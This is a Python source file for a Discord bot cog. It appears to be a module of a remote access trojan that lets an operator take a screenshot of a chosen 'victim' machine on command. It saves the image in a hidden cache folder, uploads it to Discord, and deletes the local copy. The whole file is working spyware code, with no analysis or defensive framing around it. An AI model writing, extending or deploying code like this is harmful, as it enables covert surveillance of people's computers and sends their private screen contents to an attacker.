import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, mss, time
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class GetScreenshot(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def get_screenshot(self, ctx, victim):
        """Sends screenshot of entire monitor

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            with mss.mss() as sct: 
                sct.shot( output=nr_working+"\\monitor.png" )
            await ctx.followup.send(
                embed=self.bot.genEmbed( "Screenshot of victim's PC:", datetime.now() ).set_image( file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png') )
            )
            time.sleep(2)
            os.remove(nr_working + "\\monitor.png")

def setup(bot: commands.Bot):
    bot.add_cog(GetScreenshot(bot))